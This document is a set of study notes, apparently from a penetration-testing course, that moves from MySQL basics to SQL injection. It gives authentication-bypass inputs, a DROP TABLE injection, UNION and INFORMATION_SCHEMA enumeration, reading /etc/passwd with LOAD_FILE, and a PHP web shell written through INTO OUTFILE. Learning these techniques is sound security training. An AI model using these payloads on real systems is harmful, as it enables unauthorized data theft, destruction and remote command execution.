# SQL Injection


## Overview

- many types of injection vulnerabilities are possible within web applications such as HTTP injection, code injection, and command injection
- SQLi occurs when a malicious user attempts to pass input that changes the final SQL query sent by the web application to the database, enabling the user to perform other unintended SQL queries directly against the database
- basic case is done by injecting a `single quote (')` or `double quote (")` to escape the limits of user input and inject data directly into SQL query 
- if it can be injected, try to execute different SQL query such as stacked queries or Union queries

# SQL Basic

- -u - username
- -p - password
- -p<password> (no space, note no <> just password) 
- -h - host (default = localhost)
- -P - port (default = 3306)

```sh
mysql -u root -p
mysql -u root -p<password>
mysql -u root -h docker.htb.eu -P 3306 -p
```

```sql
CREATE DATABASE db_name;
SHOW DATABASES;
USE db_name;
SHOW TABLES;
```

- data types - numbers, strings, date, time, binary data

### Create table
```sql
CREATE TABLE logins (
	id INT NOT NULL AUTO_INCREMENT,
	username VARCHAR(100) UNIQUE NOT NULL,
	password VARCHAR(100),
	date_of_joining DATETIME DEFAULT NOW(),
	PRIMARY KEY (id)
);
SHOW TABLES;
DESCRIBE table_name;

```

### INSERT 

- add new records to a given table
```sql
INSERT INTO table_name VALUES (col1_val, col2_val, col3_val,...);
INSERT INTO table_name(col1, col2) VALUES (col1_val, col2_val);
INSERT INTO table_name(col1, col2) VALUES (col1_val1, col2_val1), (col1_val2, col2_val2),...;
```

### SELECT

```sql
SELECT * FROM table_name;
SELECT col1, col2 FROM table_name; 

```

### DROP

- remove tables and databases from the server

```sql
DROP TABLE table_name; 
```

### ALTER

- change the name of any table and any of its fields or to delete or add a new column to an existing table

```sql
ALTER TABLE table_name ADD col_name INT; -- add new column
ALTER TABLE table_name RENAME COLUMN col_name TO col_new_name; -- rename
ALTER TABLE table_name MODIFY col_name DATE; -- change data type to DATE
ALTER TABLE table_name DROP col_name; -- remove column 
```

### UPDATE

- update specific records within a table based on certain contidions

```sql
UPDATE table_name SET col1=new_val1, col2=new_val2, ... WHERE <condition>;
```

## Query results

### Sorting

```sql
SELECT * FROM table_name ORDER BY col_name; 
SELECT * FROM table_name ORDER BY col_name DESC; 
SELECT * FROM table_name ORDER BY col1 DESC, col2 ASC;
```

### LIMIT 

```sql
SELECT * FROM table_name LIMIT 2; -- show only 2 results
SELECT * FROM table_name LIMIT 1,2; -- show from 2nd to 3rd result (0 index)
```

### WHERE

```sql
SELECT * FROM table_name WHERE <condition>;
```
- conditions may be for example
	- id > 1; 
	- username = 'admin';

### LIKE

```sql
SELECT * FROM table_name WHERE username LIKE 'admin%';
# - match all characters after admin
SELECT * FROM table_name WHERE col_name LIKE '---';
# - match exactly 3 characters
```

## SQL Operators
- `AND, OR, NOT`

### AND

- condition1 AND condition2
- return 0 and 1
- non-zero value in MySQL - true 

```sql
SELECT 1 = 1 AND 'test' = 'test'; # return 1
SELECT 1 = 1 && 'test' = 'abc'; # return 0
```

### OR

```sql
SELECT 1 = 1 OR 'test' = 'abc'; # return 1
SELECT 1 = 2 || 'test' = 'abc'; # 0
```

### NOT

```sql
SELECT NOT 1 = 1; # return 0
SELECT 2 != 1; # 1
```

```sql
SELECT * FROM table_name WHERE col_name != "something";
SELECT * FROM table_name WHERE col1 = "something" AND col2 > 3;
```

### Operator Precedence

```
/  *  %  
+  -  
=  >  <  <=  >=  !=  LIKE  
!  &&  ||
```
- eg
```
SELECT * FROM logins WHERE username != 'tom' AND id > 3 - 2;
```
- contains four opreations - `!= , AND , > , -`
- first operate subtraction (-)
```
SELECT * FROM logins WHERE username != 'tom' AND id > 1;
```
- then `!=` and `>` execute together
- then apply `AND` 

# SQL Injection

## SQL in PHP

- basic syntax

```php
$conn = new mysqli("localhost", "root", "password", "users");
$query = "select * from logins";
$result = $conn->query($query);

while($row = $result->fetch_assoc()) {
	echo $row["name"]."<br>";
}
``` 
```php
$searchInput = $_POST["findUser"];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query)
```
- above example, this application accepts user input and pass it directly to the SQL query without sanitization
- sanitization - refers to the removal of any special characters in user-inpt in order to break any injection attempts

- eg in $query 
```php
# if searchInput is admin,
$query = "select * from logins where username like '%admin'";
# to inject, -> 1'; DROP TABLE users;
$query = "select * from logins where username like '%1'; DROP TABLE users;"
```

## Types of SQLi

![types of SQLi](../images/types_of_sqli.jpg)

- output of both the intended and the new query may be printed directly on the front end, and directly read it (In-Band SQLi)
- if the output is not directly accessed, it have to be directed to a remote location, ie - DNS record and attempt to retrieve it from there (Out-of-band SQLi)

## SQLi Discovery

- to test whether input is vulnerable to SQLi 
- try to add one of the following payloads and in some cases, we may have to use URL encoded version of the payload

| Payload | URL Encoded |
| ------- | ----------- |
| `'`     | %27         |
| `"`     | %22         |
| `#`     | %23         |
| `;`     | %3B         |
| `)`     | %29         |

- see if it causes any errors or changes how the page behaves

## OR Injection

- Note : AND executes before OR operator

> username input = admin' OR '1'='1
> password input = 
```sql
SELECT * FROM logins WHERE username='admin' OR '1'='1' AND password='wrongpwd';
```

- if we don't know the username
> username input = something' OR '1'='1
> password input = something' OR '1'='1
```sql
SELECT * FROM logins WHERE username='something' OR '1'='1' AND password='something' OR '1'='1';
```

## Using Comments

-  `--`, `#`
- `/**/` inline comments

> username input = admin'; #
> password input = something
```sql
SELECT * FROM logins WHERE username='admin'; # AND password='something';
```
- use `%23` for '#' if input the payload in the URL within the browser

- use `--`
```sql
SELECT * FROM logins WHERE username='admin'-- AND password='whatever';
```

- for queries like this
```sql
SELECT * FROM logins WHERE (username='$username' AND id > 1) AND password='$password'
```

> username - `admin') --` 
```sql
SELECT * FROM logins WHERE (username='admin') -- 'AND id > 1) AND password='$password' 
```

## UNION 

- basic syntax
```sql
SELECT * FROM table_1 UNION SELECT * FROM table_2;
```
- row combine operation with table_1 and table_2
- data types must be the same
- numbers of columns must be the same 

### For un-even columns

- In SQL, 
```sql
SELECT "something" FROM passwords; 
```
- will always return "something" and 
```sql
SELECT 1 FROM passwords; 
```
- will always return 1
- SUPPOSE table_1 returns 2 columns and table_2 returns only 1 column
```sql
SELECT * FROM table_1 UNION SELECT col1, 1 FROM table_2;
```

### UNION Injection

1. Detect the number of columns by using
	- `ORDER BY`
	- `UNION`

- Using ORDER BY
	- `' ORDER BY 1 -- -`
	- `' ORDER BY 2 -- -`
	- etc until get an error and number is column is number before error
- Using UNION
	- `' UNION SELECT 1-- -`
	- `' UNION SELECT 1,2-- -`
	- etc until no error occurs

2. Find the location of Injection

- query may return multiple columns and the application may only display some of them
- very common that not every column will be displayed back to the user
- find the values from response page and note the positions and which values returned
- `We cannot place our injection at the beginning, or its output will not be printed`

- `' UNION SELECT 1,@@version,3,4-- -`

## Database Enumeration

1. Identify the type of DBMS

```
> Oracle - `SELECT banner FROM v$version`, `SELECT version FROM v$instance`, `SELECT * FROM v$version`
> Microsoft, MySQL - `SELECT @@version`  
> PostgreSQL - `SELECT version()`
```

2. INFORMATION_SCHEMA Database (MySQL)

- contains metadata about the databses and tables present on the server
- to reference a table present in another DB, can use '.' 
```sql
SELECT * FROM db_name.table_name;
```
- table `SCHEMATA` in the `INFORMATION_SCHEMA` database contains information about all databses on the server and `SCHEMA_NAME` column contains all the database names currently present and it will return single column

```sql
SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA;
-- will get names of databases
```

- can find the current database with `SELECT database()` query 

3. TABLES

- to find all tables within a database, use `TABLES` table in `INFORMATION_SHCEMA` database
- `TABLES` tables contains information all the tables throughout the database
- interested columns - 
	- `TABLE_SCHEMA` - points to the database each table belongs to
	- `TABLE_NAME` - stores table names

```sql
SELECT TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='db_name'; -- db names from above results
```

4. COLUMNS

- to find column names in the table 
```sql
SELECT COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS where table_name='table_name'; -- table name from above result
```

5. DATA

```sql
SELECT col1, col2 FROM db_name.table_name; -- -
```

### SUMMARY

```sql
# find database version
SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA; -- will get db names
SELECT TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='db_name'; -- will get table name
SELECT COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='table_name'; -- will get columns name
SELECT col1,col2 FROM db_name.table_name; -- will get data
```

## Reading Files

1. Determine which user we are within the database

```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user FROM mysql.user  
abc' UNION SELECT user() -- -
abc' UNION SELECT user from mysql.user -- -
```

2. look for what privileges we have with that user

```sql
SELECT super_priv FROM mysql.user;
abc' UNION SELECT super_priv FROM mysql.user -- -
abc' UNINO SELECT super_priv FROM mysql.user WHERE user="current_user" -- - result from above query 
```
- return Y - YES

```sql
SELECT grantee, privilege_type FROM INFORMATION_SCHEMA.user_privileges WHERE user="current_user";
```
- return possible privileges such as **SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, SHUTDOWN, PROCESS, FILE,...**

- **FILE** privilege - enable to read files and potentially write files

3. LOAD_FILE

- LOAD_FILE(file_name) - used in MariaDB/MySQL to read data from files
- can read only if OS give enough privileges to read
```sql
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/index.php')
```

## READ FILES

- can write a web shell on the remote server and modern DBMSes disable file-write by default
- to write files to the back-end server using a MySQL databases, require 3 things :
	1. User with `FILE` privilege enabled
	2. MySQL global `secure_file_priv` variable not enable
	3. Write access to the location we want to write to on the back-end server

1. check `FILE` privilege as above
```sql
SELECT grantee, privilege_type FROM INFORMATION_SCHEMA.user_privileges;
```

2. check `secure_file_priv` variable enable or not

```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```
- `secure_file_priv` value is empty -> we can write/read files to any location

### SELECT INTO OUTFILE

- basic function
```sql
SELECT * FROM users INTO OUTFILE '/tmp/credentials';
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```
- advanced file exports utilize `FROM_BASE64("base64_data")` to be able to write long/advanced files, including binary data

```sql
SELECT 'file written successfully!' INTO OUTFILE '/var/www/html/proof.txt';
```

- to write a web shell, we must know the base web directory for the web server (web root)
- to find web root, use `LOAD_FILE` to read server configuration at 
	- `/etc/apache2/apache2.conf` - for Apache configuration
	- `/etc/nginx/nginx.conf`
	- `%WinDir%\System32\Inetsrv\Config\ApplicationHost.conf` for IIS

- other possible web roots
```
/var/www/html/
/var/www/
/var/www/sites/
/var/www/public/
/var/www/public_html/
/var/www/html/default/
/srv/www/
/srv/www/html/
/srv/www/sites/
/home/www/
/home/httpd/
/home/$USER/public_html/
/home/$USER/www/
```
```
c:\inetpub\wwwroot\
c:\xampp\htdocs\
c:\wamp\www
```

### Writing a Web Shell

- can write the following to be able to execute commands directly on the back-end server

```php
<?php system($_REQUEST[0]); ?>
```

```sql
' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```
- requesting with above code and then next request be like `url/shell.php?0=id` will execute the id command

